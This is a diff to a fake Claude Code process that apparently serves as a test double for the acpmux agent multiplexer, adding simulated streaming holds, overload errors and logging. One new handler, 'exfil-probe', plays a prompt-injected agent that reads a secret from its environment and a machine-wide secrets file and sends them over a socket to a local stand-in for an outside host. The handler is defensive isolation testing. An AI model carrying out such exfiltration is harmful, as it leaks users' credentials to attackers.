@@ -17,7 +17,9 @@ a user and an assistant line per prompt; "history-probe" replies with the
 prompts the conversation holds (a resumed or forked transcript's included).
 "hold: PATH" answers once PATH exists, so a test can act while a turn runs;
 "tool-hold: PATH" does so inside a running Bash call, after "partial words"
-(history-probe's "unresolved" lists tool calls stored with no result).
+(history-probe's "unresolved" lists tool calls stored with no result, and
+"replies" the assistant text it holds); "stream-hold: PATH" streams "streamed so
+far" and stores that reply only once PATH exists.
 A prompt ending in "settings-probe" replies with the prompt text as Claude
 read it, every `apply_flag_settings` it got, its argv, and how many hidden cmux
 guidance blocks the prompt carried.
@@ -37,7 +39,8 @@ wait. A gate that says "read" reads them at a tool boundary (each echoed), then 
 the prompt is done. One that says "end" ends the turn first; the lines waiting then run as the
 next turn of Claude Code's own (echoed, "read: TEXT"), which waits for the next gate; "end-first"
 does the same with only the first waiting line, and the rest stay unread; "fail" ends the turn
-with a connection error. An interrupt is answered and changes nothing.
+with a connection error, and "overload" with the provider's "Repeated 529 Overloaded errors" (in
+the result Claude Code calls a success, `claude_stdio/api_error.rs`). An interrupt is answered and changes nothing.
 A stop_task control request ends its task killed (task_updated);
 FAKE_CLAUDE_STOP_NOTIFY=1 sends the task's task_notification too.
 "fg-shell" runs a foreground Bash call until a background_tasks control
@@ -73,8 +76,8 @@ Claude Code's own "Not logged in · Please run /login".
 FAKE_CLAUDE_SKILLS=1 has one skill installed and sends system/init every turn.
 FAKE_CLAUDE_INIT (a JSON object) adds its fields to system/init (`mcp_servers`,
 `skills`, ...); with FAKE_CLAUDE_CONTROL_LOG set, the subtype of every
-control request is appended to that file, one per line. FAKE_CLAUDE_PAUSE_LOG logs each
-set_prompt_suggestions_paused as its request id's prefix and the value.
+control request is appended to that file, one per line. FAKE_CLAUDE_INIT_LOG logs each
+initialize as its pid and whether it asked for prompt suggestions.
 FAKE_CLAUDE_CONTEXT=1 answers get_context_usage with a /context breakdown
 (=error refuses it). FAKE_CLAUDE_LATE_CONTEXT=<path> makes a FAKE_CLAUDE_DIE_IF prompt a
 usage limit instead (the process lives on, and answers no more get_context_usage), and leaves a
@@ -86,8 +89,9 @@ replies with that environment variable. Any plain prompt
 replies with the process's argv (spawn flags such as `--disallowedTools`).
 "agent-503" starts a background agent (agent id A503) whose task fails on SR2's 503 after the
 turn; Claude Code then runs a turn of its own for the notification ("agent-503-held: PATH"
-holds that turn until PATH exists; "agent-400" fails on a bad request instead, "agent-reset" on
-a dropped connection). A prompt naming SendMessage to that agent resumes it: its task starts
+holds that turn until PATH exists; "agent-503-late: PATH" fails only once PATH exists, with no
+turn of its own, as a failure that lands while a person's turn runs; "agent-400" fails on a bad
+request instead, "agent-reset" on a dropped connection). A prompt naming SendMessage to that agent resumes it: its task starts
 again under the SendMessage call (with FAKE_CLAUDE_RESUME_FAILS=1 it fails on the 503 again; with
 FAKE_CLAUDE_FORGET_AGENTS=1, 64 other agents fail first; with FAKE_CLAUDE_RESUME_COMPLETES=1 it
 completes).
@@ -175,6 +179,10 @@ def is_cmux_guidance(block):
     """Identify hidden cmux guidance in the stream-json content Claude receives."""
     if not isinstance(block, dict):
         return False
+    # The files acpmux prefetched into the prompt (`hub/prefetch.rs`): left out of fixture
+    # commands and echoes unless FAKE_ECHO_PREFETCH=1.
+    if os.environ.get("FAKE_ECHO_PREFETCH") != "1" and str(block.get("text", "")).lstrip().startswith("<cmux-prefetch-context>"):
+        return True
     source = (block.get("_meta") or {}).get("acpmux", {}).get("contextSource")
     if source in {"cmux-default", "cmux-user", "cmux-project", "cmux-guidance"}:
         return True
@@ -280,6 +288,17 @@ def extra_agents():
 
 def agent_failed(said):
     """The end of "agent-503"'s agent, after its turn, and Claude Code's own turn for it."""
+    if said.startswith("agent-503-late: "):
+        path = said[len("agent-503-late: "):].split("<", 1)[0].split()[0]
+
+        def fail_late():
+            import time
+            while not os.path.exists(path):
+                time.sleep(0.02)
+            agent_failure("toolu_a503")
+
+        threading.Thread(target=fail_late, daemon=True).start()
+        return
     agent_failure("toolu_a503", next(k for k in AGENT_ERRORS if said.startswith(k)))
     for tool, task in extra_agents():
         send({"type": "system", "subtype": "task_notification", "task_id": task, "tool_use_id": tool,
@@ -462,6 +481,15 @@ def gated(prompt, base):
         if how == "fail":
             send({"type": "result", "subtype": "success", "is_error": True, "num_turns": 1,
                   "result": "API Error: Connection error.", "duration_api_ms": 5})
+            return
+        if how == "overload":
+            # As Claude Code ends a turn its retries gave up on: its own synthetic API error
+            # line, then a result that does not say it failed.
+            send({"type": "assistant", "message": {"id": "api-error", "model": "<synthetic>",
+                  "role": "assistant", "content": [{"type": "text",
+                  "text": "API Error: Repeated 529 Overloaded errors"}]}})
+            send({"type": "result", "subtype": "success", "is_error": False, "num_turns": 1,
+                  "result": "API Error: Repeated 529 Overloaded errors", "duration_api_ms": 5})
             return
         if how == "read":
             for m in waiting:
@@ -762,10 +790,10 @@ while True:
         if os.environ.get("FAKE_CLAUDE_CONTROL_LOG"):
             with open(os.environ["FAKE_CLAUDE_CONTROL_LOG"], "a") as f:
                 f.write(str(request.get("subtype")) + "\n")
-        # FAKE_CLAUDE_PAUSE_LOG=<file>: each set_prompt_suggestions_paused as "<request id prefix> <paused>".
-        if request.get("subtype") == "set_prompt_suggestions_paused" and os.environ.get("FAKE_CLAUDE_PAUSE_LOG"):
-            with open(os.environ["FAKE_CLAUDE_PAUSE_LOG"], "a") as f:
-                f.write(str(msg.get("request_id", "")).split("-")[0] + " " + str(request.get("paused")).lower() + "\n")
+        # FAKE_CLAUDE_INIT_LOG=<file>: each initialize as "init <pid> <promptSuggestions>".
+        if request.get("subtype") == "initialize" and os.environ.get("FAKE_CLAUDE_INIT_LOG"):
+            with open(os.environ["FAKE_CLAUDE_INIT_LOG"], "a") as f:
+                f.write(f"init {os.getpid()} " + str(request.get("promptSuggestions") is True).lower() + "\n")
         # Like Claude Code, the next init reports the mode the session was switched to.
         if request.get("subtype") == "set_permission_mode" and isinstance(request.get("mode"), str):
             MODE = request["mode"]
@@ -782,6 +810,13 @@ while True:
             send({"type": "control_response", "response": {"subtype": "error", "request_id": msg.get("request_id"),
                   "error": refusal}})
             continue
+        # FAKE_CLAUDE_HOLD_FORK_IF=<path>: a `--fork-session` start answers initialize only once
+        # that file is gone (a fork whose agent a daemon restart cuts off as it starts).
+        hold_fork = os.environ.get("FAKE_CLAUDE_HOLD_FORK_IF")
+        if request.get("subtype") == "initialize" and hold_fork and "--fork-session" in sys.argv:
+            import time
+            while os.path.exists(hold_fork):
+                time.sleep(0.05)
         # FAKE_CLAUDE_INIT_DELAY_MS: the initialize answer takes that long (a slow start).
         if request.get("subtype") == "initialize" and os.environ.get("FAKE_CLAUDE_INIT_DELAY_MS"):
             import time
@@ -859,6 +894,8 @@ while True:
             found.append("vertex")
         if env.get("CLAUDE_CODE_USE_BEDROCK") == "1":
             found.append("bedrock")
+        if env.get("CLAUDE_CODE_USE_FOUNDRY") == "1":
+            found.append("foundry")
         helper = settings.get("apiKeyHelper")
         if helper:
             run = subprocess.run(["/bin/sh", "-c", helper], capture_output=True, text=True)
@@ -878,6 +915,7 @@ while True:
                                "vertexRegions": sorted(k for k in os.environ if k.startswith("VERTEX_REGION_")),
                                "awsKeys": sorted(k for k in os.environ if k.startswith("AWS_")),
                                "googleKeys": sorted(k for k in os.environ if k.startswith("GOOGLE_")),
+                               "azureKeys": sorted(k for k in os.environ if k.startswith("AZURE_")),
                                "promptCache": {k: v for k, v in os.environ.items()
                                                if k.startswith(("DISABLE_PROMPT_CACHING", "ENABLE_PROMPT_CACHING_1H"))
                                                or k == "FORCE_PROMPT_CACHING_5M"},
@@ -949,11 +987,15 @@ while True:
                 f.write(json.dumps({"type": "user", "sessionId": SESSION, "timestamp": at,
                                     "message": {"role": "user", "content": transcript_content(content, said)}}) + "\n")
                 reply = {"role": "assistant", "stop_reason": "end_turn", "content": [{"type": "text", "text": "ok"}]}
+                # "stream-hold: PATH" stores its reply only once it ends, as Claude Code does.
+                if said.startswith("stream-hold: "):
+                    reply = None
                 # FAKE_CLAUDE_TRANSCRIPT_USAGE=1: the reply carries its call's model and usage, as Claude Code's does.
                 if os.environ.get("FAKE_CLAUDE_TRANSCRIPT_USAGE") == "1":
                     reply.update({"id": "msg_" + uuid.uuid4().hex, "model": "claude-opus-5-5", "usage": {
                         "input_tokens": 3, "cache_creation_input_tokens": 1000, "cache_read_input_tokens": 200_000, "output_tokens": 50}})
-                f.write(json.dumps({"type": "assistant", "sessionId": SESSION, "timestamp": at, "message": reply}) + "\n")
+                if reply is not None:
+                    f.write(json.dumps({"type": "assistant", "sessionId": SESSION, "timestamp": at, "message": reply}) + "\n")
             # The model's reply takes time: a turn's prompt is never stored in
             # the millisecond its turn ends.
             import time
@@ -1075,6 +1117,21 @@ while True:
                     f.write(json.dumps({"type": "user", "sessionId": SESSION, "timestamp": at, "message": {"role": "user",
                                         "content": [{"type": "tool_result", "tool_use_id": "toolu_hold", "content": "waited"}]}}) + "\n")
             send({"type": "user", "message": {"content": [{"type": "tool_result", "tool_use_id": "toolu_hold", "content": "waited"}]}})
+        # "stream-hold: PATH": the turn streams "streamed so far" in API message msg_streaming,
+        # which Claude Code stores only once it ends, and holds until PATH exists.
+        if said.startswith("stream-hold: "):
+            import time
+            gate = said[len("stream-hold: "):]
+            send({"type": "stream_event", "event": {"type": "message_start", "message": {"id": "msg_streaming",
+                                                     "model": "claude-haiku-5-5"}}})
+            send({"type": "stream_event", "event": {"type": "content_block_delta", "index": 0,
+                                                     "delta": {"type": "text_delta", "text": "streamed so far"}}})
+            while not os.path.exists(gate):
+                time.sleep(0.02)
+            if STORE and LAYOUT:
+                with open(stored(SESSION), "a") as f:
+                    f.write(json.dumps({"type": "assistant", "sessionId": SESSION, "timestamp": at, "message": {
+                        "id": "msg_streaming", "role": "assistant", "content": [{"type": "text", "text": "streamed so far"}]}}) + "\n")
         # "hold: PATH" keeps the turn running until PATH exists.
         if said.startswith("hold: "):
             import time
@@ -1091,6 +1148,21 @@ while True:
         if asked.startswith("envs:"):
             names = [name.strip() for name in asked[5:].split(",") if name.strip()]
             text = json.dumps({name: os.environ.get(name, "") for name in names}, sort_keys=True)
+        # "exfil-probe NAME PORT": a prompt-injected agent hunting another chat's secret. It reads
+        # NAME from its environment and the machine-wide secrets file, and sends what it found to
+        # 127.0.0.1:PORT (the test's stand-in for an outside host). Replies what it had, as bools.
+        if asked.startswith("exfil-probe "):
+            import socket
+            name, port = asked[len("exfil-probe "):].split()
+            found = os.environ.get(name, "")
+            try:
+                with open(os.path.join(os.environ.get("HOME", "/nonexistent"), ".config", "cmux", "machine-secrets.env")) as f:
+                    on_disk = f.read()
+            except OSError:
+                on_disk = ""
+            with socket.create_connection(("127.0.0.1", int(port)), timeout=3) as out:
+                out.sendall(f"env={found}\nfile={on_disk}\n".encode())
+            text = json.dumps({"env": bool(found), "file": bool(on_disk)}, sort_keys=True)
         if said.endswith("settings-probe"):
             text = json.dumps({"said": said, "settings": FLAG_SETTINGS, "argv": sys.argv[1:],
                                "guidance": sum(1 for b in content if is_cmux_guidance(b))})
@@ -1106,7 +1178,11 @@ while True:
                                            and visible_transcript_text(r["message"]["content"]) != "history-probe"],
                                "sessions": sorted({r["sessionId"] for r in records}),
                                # Tool calls the conversation holds with no result: Claude's API refuses those.
-                               "unresolved": [i for i in used if i not in answered]})
+                               "unresolved": [i for i in used if i not in answered],
+                               # The assistant text the conversation holds, in order.
+                               "replies": [b["text"] for r in records if r.get("type") == "assistant"
+                                           for b in (r["message"]["content"] if isinstance(r["message"]["content"], list) else [])
+                                           if isinstance(b, dict) and b.get("type") == "text"]})
         documents = [b for b in content if isinstance(b, dict) and b.get("type") == "document"]
         if said.strip() == "document-probe":
             text = json.dumps({
@@ -1365,7 +1441,10 @@ while True:
             text = json.dumps({k: os.environ.get(k) for k in (
                 "CLAUDE_CODE_MAX_CONCURRENT_SUBAGENTS", "CLAUDE_CODE_MAX_SUBAGENTS_PER_SESSION",
                 "CLAUDE_CODE_MAX_SUBAGENT_SPAWN_DEPTH", "CLAUDE_CODE_MAX_TOOL_USE_CONCURRENCY",
-                "BASH_MAX_TIMEOUT_MS", "BASH_DEFAULT_TIMEOUT_MS")}, sort_keys=True)
+                "BASH_MAX_TIMEOUT_MS", "BASH_DEFAULT_TIMEOUT_MS", "CLAUDE_CODE_RETRY_WATCHDOG",
+                "CLAUDE_CODE_RETRY_WATCHDOG_SCOPE", "CLAUDE_CODE_RETRY_WATCHDOG_MAX_WAIT_MS", "CLAUDE_CODE_MAX_RETRIES",
+                "CLAUDE_CODE_RETRY_WATCHDOG_MAX_USAGE_LIMIT_WAIT_MS")},
+                sort_keys=True)
         # "bg-moved": a foreground shell moved to the background while it ran (a task_updated
         # patch), then ended; its notification names only the task.
         if said.strip() == "bg-moved":
@@ -1443,7 +1522,7 @@ while True:
                       {"content": "Cover it", "status": "in_progress", "activeForm": "Covering it"},
                       {"content": "Update docs", "status": "pending", "activeForm": "Updating docs"}]}}]}})
         # "task-probe": the turn keeps its list with Claude Code 2.1's TaskCreate and TaskUpdate,
-        # which Claude Code offers only with CLAUDE_CODE_ENABLE_TODO_TOOLS=1 (acpmux sets it).
+        # which Claude Code offers only with CLAUDE_CODE_ENABLE_TODO_TOOLS=1 (acpmux never sets it).
         if said.strip() == "task-probe" and os.environ.get("CLAUDE_CODE_ENABLE_TODO_TOOLS") == "1":
             def task_call(tool_id, name, tool_input, result_text, tool_use_result):
                 send({"type": "assistant", "message": {"content": [
@@ -1504,10 +1583,13 @@ while True:
             threading.Thread(target=end_background_agent, daemon=True).start()
         # "own-turn: FIFO :: TEXT": once the test writes FIFO, while the chat is idle, a background
         # shell ends and Claude Code runs a turn of its own for its task notification that says
-        # TEXT (acpmux hub/background_turn.rs).
-        if said.strip().startswith("own-turn:"):
-            gate, text = said.strip()[len("own-turn:"):].split(" :: ", 1)
+        # TEXT (acpmux hub/background_turn.rs). "own-turn-fail: FIFO :: ERROR": that turn fails
+        # with ERROR as its result (a 429's "API Error: ...", `is_error`).
+        own = next((p for p in ("own-turn:", "own-turn-fail:") if said.strip().startswith(p)), None)
+        if own:
+            gate, text = said.strip()[len(own):].split(" :: ", 1)
             gate = gate.strip()
+            failed = own == "own-turn-fail:"
 
             def own_turn():
                 with open(gate) as g:
@@ -1518,8 +1600,8 @@ while True:
                 send({"type": "stream_event", "event": {"type": "message_start", "message": {"id": "msg_own1"}}})
                 send({"type": "stream_event", "event": {"type": "content_block_delta", "index": 0,
                                                          "delta": {"type": "text_delta", "text": text}}})
-                send({"type": "result", "subtype": "success", "result": text, "num_turns": 1,
-                      "duration_api_ms": 1, "usage": {"input_tokens": 1, "output_tokens": 1}})
+                send({"type": "result", "subtype": "success", "is_error": failed, "result": text,
+                      "num_turns": 1, "duration_api_ms": 1, "usage": {"input_tokens": 1, "output_tokens": 1}})
 
             threading.Thread(target=own_turn, daemon=True).start()
         if said.strip() == "late-agent-ask":
